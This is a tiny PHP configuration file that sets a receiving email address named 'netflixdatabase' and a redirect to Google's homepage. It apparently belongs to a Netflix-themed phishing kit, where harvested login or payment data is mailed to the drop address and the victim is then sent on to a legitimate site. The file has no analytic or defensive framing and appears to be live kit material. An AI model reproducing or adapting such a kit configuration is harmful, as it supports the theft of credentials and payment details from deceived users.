<?php 
$Receive_email="netflixdatabase@gmail.com";
$redirect="https://www.google.com/";
?>